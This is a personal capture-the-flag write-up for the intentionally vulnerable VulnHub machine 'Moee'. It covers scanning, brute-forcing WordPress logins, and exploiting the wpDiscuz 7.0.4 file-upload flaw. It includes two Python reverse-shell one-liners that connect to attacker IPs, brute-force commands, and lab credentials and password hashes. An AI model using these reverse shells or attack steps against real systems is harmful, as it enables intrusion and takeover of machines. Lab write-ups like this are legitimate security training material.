# BOX NAME: Moee
**LINK**: https://www.vulnhub.com/entry/moee-1,608/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate the box, get the ip, attack the wordpress-site with a brute-force.
2. grab all the plugins and check if there's any know vulns. Bingo.
3. Exploit wpDiscuz vuln to get code execution. Execute a reverse shell.
4. Enumerate the box locallyand ..
5.

```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.45
[+] URL:	http://Moee
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-moee.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 07:24 CEST
Nmap scan report for Moee (10.77.0.45)
Host is up (0.00044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 a7b903d832023a9e95e636d4d7a3477d (DSA)
|   2048 f09c9c138362ee22ba67e9b084a5fc4c (RSA)
|   256 2e3f41eb1c54c5cab0f1b5e517fc98c4 (ECDSA)
|_  256 318bac637d7fc6184e4e7b158b308b02 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
| http-title: Moee &#8211; Just another WordPress site
|_Requested resource was http://moee/
|_http-generator: WordPress 5.5.3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.52 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
http://moee [200 OK] Apache[2.4.10]
 Country[RESERVED][ZZ]
 HTML5
 HTTPServer[Debian Linux][Apache/2.4.10 (Debian)]
 IP[10.77.0.45]
 MetaGenerator[WordPress 5.5.3]
 PoweredBy[-wordpress-wordpress

WordPress]
 Script
 Title[Moee &#8211; Just another WordPress site]
 UncommonHeaders[link]
 WordPress[5.5.3]
```

nikto-scan
```
─$ nikto -h $URL | tee nikto-moee.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.45
+ Target Hostname:    Moee
+ Target Port:        80
+ Start Time:         2023-05-05 07:23:58 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Uncommon header 'x-redirect-by' found, with contents: WordPress.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: http://moee/
+ /index.php?: Drupal Link header found with value: <http://moee/>; rel=shortlink. See: https://www.drupal.org/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information.
+ /wp-login.php: Wordpress login found.
+ 7850 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2023-05-05 07:24:29 (GMT2) (31 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing
```

```
other
```
[+] WordPress version 5.5.3 identified (Insecure, released on 2020-10-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://moee/index.php/feed/, <generator>https://wordpress.org/?v=5.5.3</generator>
 |  - http://moee/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.3</generator>

└─$ wpscan --url $URL --ignore-main-redirect -e u,ap -o wpscan-moee.log

[+] Joxter
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Snufkin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] user
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] snufkin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] joxter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] boe
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

 └─$ wpscan --url $URL -U usernames.txt -P /base/wordlists/password/rockyou.txt

 [!] Valid Combinations Found:
 | Username: Joxter, Password: 1a2b3c4d

```
</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1. Found a wordpress site. Enumerated users and plugins. Got access.
2. Attack the webapp to get at reverse shell.

 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthenticated)         | php/webapps/49962.sh
WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)         | php/webapps/49967.py
Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Upload (Metasplo | php/webapps/49401.rb


So the exploit is to upload a image via the wpDiscuz plugin, logged in as Joxter. The image itself contans php-code wich wi'll get executed when visited.
This way allows you to grab a reverse shell like so.

not encoded: /usr/bin/python -c 'import os,pty,socket;s=socket.socket();s.connect(("10.77.0.35",443));os.du2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
url encoded: %2Fusr%2Fbin%2Fpython%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.77.0.35%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27

I grabbed and manipulated the the picture from the website, with the mother and the child. Oh the irony.
```
1;

![1.png](https://github.com/jockemedlinux/writeups/blob/main/VulnHUB/Moee/1.png?raw=true)

2;

![2.png](https://github.com/jockemedlinux/writeups/blob/main/VulnHUB/Moee/2.png?raw=true)

3;

![3.png](https://github.com/jockemedlinux/writeups/blob/main/VulnHUB/Moee/3.png?raw=true)

</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/var/www/html/wp-config.php
/var/www/html/wp-includes/wp-db.php
```

**SUID's**:

```
/home/Boe/ropit                                                                                                                                                                                                                             
/bin/mount                                                                                                                                                                                                                                  
/bin/su                                                                                                                                                                                                                                     
/bin/umount                                                                                                                                                                                                                                 
/usr/lib/eject/dmcrypt-get-device                                                                                                                                                                                                           
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/sudo
```
**SGID's**:

```
/usr/bin/bsd-write
/usr/bin/wall
/usr/bin/ssh-agent
/usr/bin/chage
/usr/bin/expiry
/usr/bin/crontab
/sbin/unix_chkpwd
```
**OTHERS**:

```
ropit: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2ccb5e1faf30c4f0d1ff927d6ba16887ccafb673, not stripped
```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```
/bin/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f89d987acd450c84e6f66c36203173d37e4f2fa2, stripped
 

bash: lsb_release: command not found


Linux moee 3.16.0-11-amd64 #1 SMP Debian 3.16.84-1 (2020-06-09) x86_64 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
joxter:1a2b3c4d         [wordpress]
Joxter:0ffs3cJ0xt3r!!   [ssh]
boe:
boe2:
user:
admin
snufkin:t3ch5nufk1n     [mysql]
Boee: ?
Stinky: 1d1dtt3st1ng
Sniff: 7h3 Muddl3r
Snork:
```
Wordpress
```
/** MySQL database username */
define( 'DB_USER', 'user' );
/** MySQL database password */
define( 'DB_PASSWORD', 'userpasswd' );
```
Wordpress seperate
```
/var/www/html/public_html/wp-includes/wp-db.php
<ic_html/wp-includes$ grep Username -A5 -B5 wp-db.php                        
<?php

// Take this creds to login in one of the service. 
// Username: snufkin
// Password: t3ch5nufk1n## 
/**
 * WordPress database access abstraction class
```
```
 select * from user_details;
+---------+----------+-------------------------------+
| User_id | Username | Password                      |
+---------+----------+-------------------------------+
|       1 | Boee     | MSLJDFALkljsdfMIYR=           |
|       2 | Stinky   | MWQxZHQzc3QxbmcK=             |
|       3 | Sniff    | N2gzIE11ZGRsM3IK=             |
|       4 | Snork    | https://pastebin.com/0wstpQk0 |
+---------+----------+-------------------------------+
```
```
[STATUS] 166.00 tries/min, 166 tries in 00:01h, 1367 to do in 00:09h, 15 active
[22][ssh] host: 10.77.0.45   login: Joxter   password: 0ffs3cJ0xt3r!!
```

I see some very strange files on this box. We have a .viminfo file in joxters home containing what appears to be a revshell.
The file itself does not contain this. Imma abuse this. The clue goes on about a cron-job. So I guess I should get a revshell via this script.
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.42.69",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```
+----+------------+------------------------------------+---------------+-----------------+----------------------+---------------------+-----------------------------------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email      | user_url             | user_registered     | user_activation_key                           | user_status | display_name |
+----+------------+------------------------------------+---------------+-----------------+----------------------+---------------------+-----------------------------------------------+-------------+--------------+
|  1 | user       | $P$BSsAlgA7qDOQFfZYVze6KO48091sn81 | user          | asdf@lol.com    | http://192.168.42.86 | 2020-10-13 21:18:01 |                                               |           0 | user         |
|  4 | Snufkin    | $P$BghGdW9kvudcJWOnTi.TfmJw7tzsgR/ | snufkin       | snufkin@moee.io |                      | 2020-11-10 07:10:37 |                                               |           0 | Snufkin      |
|  6 | Joxter     | $P$B7SOjzTIu5bBYTnO1SfWyL2bJF51xn0 | joxter        | joxter@moee.io  | https://lol.io       | 2020-11-10 07:21:46 |                                               |           0 | Joxter       |
|  7 | Boe        | $P$B7JYXSreWFvNpm3kbrHa9ho.NDG0K80 | boe           | admin@moee.io   |                      | 2020-11-10 07:22:44 | 1604992967:$P$B5GhycTz/ggydRObeQMNvOtxfWCzaY1 |           0 | Boe          |
+----+------------+------------------------------------+---------------+-----------------+----------------------+---------------------+-----------------------------------------------+-------------+--------------+

user:$P$BSsAlgA7qDOQFfZYVze6KO48091sn81
Snufkin:$P$BghGdW9kvudcJWOnTi.TfmJw7tzsgR/
Joxter:$P$B7SOjzTIu5bBYTnO1SfWyL2bJF51xn0
Boe:$P$B7JYXSreWFvNpm3kbrHa9ho.NDG0K80
Boe2:$P$B5GhycTz/ggydRObeQMNvOtxfWCzaY1
```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```

```

```
www-data@moee:/var/www/public_html$ cat flag1.txt
cat flag1.txt
Congrats, finally you exploited the damn vulnerable plugin and got the initial Shell. Now your next task is to look for clue which lend you further and it isn't far from your home directory. 
- GoodLuck
```

```
cat flag2.txt
Congrats, Joxter though you were lazy and worry-free you got yourself with some OSINT. Now it's your time to use the premonitions which you call "Forebodings" to protect Boe from a bigger disaster things. For that you have to recall your mind like a cron things as in linux.
- Moominpappa's Memoirs (Boe)

```
``` 
Boe@moee:~$ cat flag3.txt
Once again, thanks Joxter for protecting me(Boe) from the disaster which was about to come and take my life. Now I have some work to do with my own task so let me create some plan for ROP(Record of Performance) about you and Snufkin. Therefore stay safe, don't be lazy and try to use the "Forebodings" more. 

- Moominpappa's Memories (Boe)
```

</details>